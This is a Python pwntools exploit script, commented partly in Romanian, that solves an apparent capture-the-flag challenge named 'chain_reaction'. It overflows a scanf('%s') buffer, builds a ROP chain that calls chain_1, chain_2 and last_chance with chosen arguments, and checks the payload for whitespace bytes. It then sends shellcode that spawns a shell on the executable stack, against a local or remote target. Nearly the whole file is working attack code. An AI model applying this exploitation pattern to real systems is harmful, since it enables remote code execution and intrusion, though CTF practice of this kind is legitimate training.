#!/usr/bin/env python3
# ============================================================================
# CTF: chain_reaction — stack BOF -> ROP -> shellcode pe stiva
# Vulnerabilitate: scanf("%s") fara limita => overflow (buf 64 + rbp 8 = 72).
#   ROP: pop rdi / pop rsi;r15 pt a chema chain_1(arg) si chain_2(args), apoi
#   last_chance() face read() de shellcode pe stiva si-l executa.
# Binar: ELF 64-bit (amd64), not stripped | NX OFF (stiva RWE) · fara canary · No-PIE
#   - NX dezactivat => shellcode executabil direct pe stiva. Fara canary => overflow
#     direct la ret. No-PIE => adrese gadget fixe. scanf("%s") interzice whitespace
#     (0x09-0x0d,0x20) => payload-ul e verificat sa nu contina acei bytes.
# ============================================================================
import sys
from pwn import *

context.binary = elf = ELF('./chain_reaction')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./chain_reaction')

p = connect()

chain_1     = elf.symbols['chain_1']
chain_2     = elf.symbols['chain_2']
last_chance = elf.symbols['last_chance']

# gadgets (scanf %s forbids whitespace bytes 0x09-0x0d, 0x20; all of these are clean)
pop_rdi     = 0x0040116a         # pop rdi ; ret
pop_rsi_r15 = 0x0040116c         # pop rsi ; pop r15 ; ret

payload  = b'A' * 72                                    # buf(64) + saved rbp(8)
payload += p64(pop_rdi) + p64(0xdeadbeef) + p64(chain_1)
payload += p64(pop_rdi) + p64(0xcafebabe)
payload += p64(pop_rsi_r15) + p64(0xdeadc0de) + p64(0x4242424242424242)
payload += p64(chain_2)
payload += p64(last_chance)

# sanity: no whitespace byte that would truncate scanf("%s")
assert not (set(payload) & {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}), "whitespace byte in payload!" # pentru ca e scanf, daca era read nu trebuia verificat nimic

p.recvuntil(b"start chain reaction: ")
p.sendline(payload)

# last_chance read()s our shellcode onto the (RWE) stack and calls it
p.recvuntil(b"Now give me something")
p.send(asm(shellcraft.amd64.linux.sh()))   # ~44 bytes, fits in 0x40

p.interactive()
